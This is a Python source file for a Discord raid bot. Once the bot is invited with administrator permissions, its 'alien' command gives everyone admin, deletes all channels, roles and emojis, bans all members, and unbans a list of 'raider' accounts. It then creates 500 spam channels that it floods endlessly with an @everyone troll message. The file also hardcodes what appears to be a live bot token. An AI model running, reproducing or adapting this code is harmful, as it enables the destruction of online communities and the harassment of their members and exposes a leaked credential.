import discord
from discord.ext import commands
import random
from discord import Permissions
import asyncio

token = "OTQxMzQwMTk0NTU1MTk5NTE4.GzgNK_.X7R0C0kmAl3FBYTcA8lHvk5dguPlrpBt1CUuEE"
#print(discord.__version__)
invite_bot = "https://discord.com/api/oauth2/authorize?client_id=941340194555199518&permissions=8&scope=bot"

SPAM_CHANNEL =  ["‣▵◀︎❖❖❥❥❥❁❁🞭🞻🞻" , "ƸƸƹððȣ" , "Æ" , "❮❯","ℷℷℷ∇∇∞⨊∰𝛡","Ω℠№℔℆℀℃♡♘", "⚽︎✎✑☭☯︎☦︎✛✟🀼🃆✁✂︎⛽︎", " ඞ ඞ ඞ ඞ ඞ", "ƂÆĘȞŒØḧṃțẑꬿ", "ရင်းနှီးမြှုပ်နှံမှုပွဲတော်", "放蕩的動物"]
SPAM_MESSAGE = ['''@everyone What's up guys! It's Quandale Dingle here! (RUUEHEHEHEHEHEEHE) I have been arrested for multiple crimes (AHHHHHHHHHHHHH) including: Battery on a police officer (WHAT), Grand theft, Declaring war on Italy, and public indecency (RUHEHEHEEHEHEHEHEHEHEHE X2 speed). I will be escaping prison on, MARCH 28TH! After that.... I WILL TAKE OVER THE WORLD''']
client = commands.Bot(command_prefix="%")


@client.event
async def on_ready():
  print("")
  print('We have logged in as {0.user}'.format(client))
  print("")
  print("----------------------------------------------")

@client.command()

async def stop(ctx):
   if ctx.message.author.id == 786937653311569940:
      await ctx.message.delete()
      await ctx.bot.logout()
      print (f"{client.user.name} has logged out successfully.")

@client.command()

async def alien(ctx):
   if ctx.message.author.id == 786937653311569940:
    await ctx.message.delete()
    with open('/Users/MatthewHa/code-ha/python/python/alien.jpeg', 'rb') as f:
      icon = f.read()
    await ctx.guild.edit(name="Alien")
    await ctx.guild.edit(icon=icon)
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print( "I have given everyone admin.")
    except:
      print( "I was unable to give everyone admin")
    for channel in guild.channels:
      try:
        await channel.delete()
        print(f"{channel.name} was deleted.")
      except:
        print( f"{channel.name} was NOT deleted." )
    for member in guild.members:
     try:
       await member.ban()
       print(f"{member.name}#{member.discriminator} Was banned" )
     except:
       print( f"{member.name}#{member.discriminator} Was unable to be banned." )
    for role in guild.roles:
     try:
       await role.delete()
       print(f"{role.name} Has been deleted" )
     except:
       print(f"{role.name} Has not been deleted")
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print( f"{emoji.name} Was deleted"  )
     except:
       print(f"{emoji.name} Wasn't Deleted")
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      raider1 = '852532529076764672'
      raider2 = '909100865971974244'
      raider2 = '857900300345147432'
      raider3 = '786937653311569940'
      raider4 = '912018825829031997'
      raider5 = '912018825829031997'
      user_fetch1 = await client.fetch_user(raider1)
      user_fetch2 = await client.fetch_user(raider2)
      user_fetch3 = await client.fetch_user(raider3)
      user_fetch4 = await client.fetch_user(raider4)
      user_fetch5 = await client.fetch_user(raider5)
      

      try: 
        await ctx.guild.unban(user_fetch1)
        await ctx.guild.unban(user_fetch2)
        await ctx.guild.unban(user_fetch3)
        await ctx.guild.unban(user_fetch4)
        await ctx.guild.unban(user_fetch5)

        print(f"{user.name}#{user.discriminator} Was successfully unbanned.")
      except:
        print(f"{user.name}#{user.discriminator} Was not unbanned.")
    await guild.create_text_channel("ậ")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"Raided {guild.name} Successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

@client.command()
async def clear(ctx):
    for c in ctx.guild.channels: 
        await c.delete()
    print('Deleted all channels')


        
        
@client.command()
async def sudo(ctx):
    if ctx.message.author.id == 786937653311569940:
        await ctx.message.delete()
        role = discord.utils.get(ctx.guild.roles, name = "@everyone")
        await role.edit(permissions = Permissions.all())

@client.command()
async def unban(ctx, id: int):
    user = await bot.fetch_user(id)
    await ctx.guild.unban(user)



client.run(token, bot=True)
